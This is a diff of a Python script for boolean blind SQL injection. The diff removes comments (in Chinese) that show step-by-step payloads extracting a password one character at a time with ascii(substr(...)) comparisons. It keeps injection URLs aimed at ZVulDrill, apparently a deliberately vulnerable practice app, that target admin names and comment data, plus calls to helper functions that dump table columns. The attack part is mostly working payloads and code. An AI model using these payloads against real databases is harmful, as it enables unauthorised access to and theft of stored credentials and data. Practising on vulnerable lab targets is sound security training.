@@ -1,23 +1,9 @@
-
-# 盲注第一个字符
-# id=0 or if((select ascii(substr((select password from user limit 0,1),1,1))>111),1,0)
-# 盲注第二个字符
-# id=0 or if((select ascii(substr((select password from user limit 0,1),2,1))>118),1,0)
-# 盲注第三个字符
-# id=0 or if((select ascii(substr((select password from user limit 0,1),3,1))>99),1,0)
-# 盲注第四个字符
-# id=0 or if((select ascii(substr((select password from user limit 0,1),4,1))>48),1,0)
-# 盲注第五个字符
-# id=0 or if((select ascii(substr((select password from user limit 0,1),5,1))=0),1,0)
-# 返回正常 第五个字符ascii为0--对应为null---说明第一行的password值已经全部注入出来
-
 #http://172.30.61.112/ZVulDrill-master/search.php?search=1'or if((select ascii(substr((select admin_name from admin limit 0,1),1,1))=97),1,0)%23
 #http://172.30.61.112/ZVulDrill-master/search.php?search=1'or if((select ascii(substr((select comment_text from comment limit 0,1),1,1))=49),1,0)%23
 
 import urllib
 from urllib import request
 from data import glovar, glofun
-
 
 #得出单列数据
 
@@ -102,7 +88,6 @@ if __name__ == "__main__":
     #get_tbname(url=glovar.url3, cookie=False, type='search',tbname='comment', coname='comment_id',rowcount=9)
 
     get_tbname(glovar.url4, cookie=glovar.cookie, type='int', tbname='movies', coname='title',rowcount=9)
-
 
 
     #get_dbname_test2()
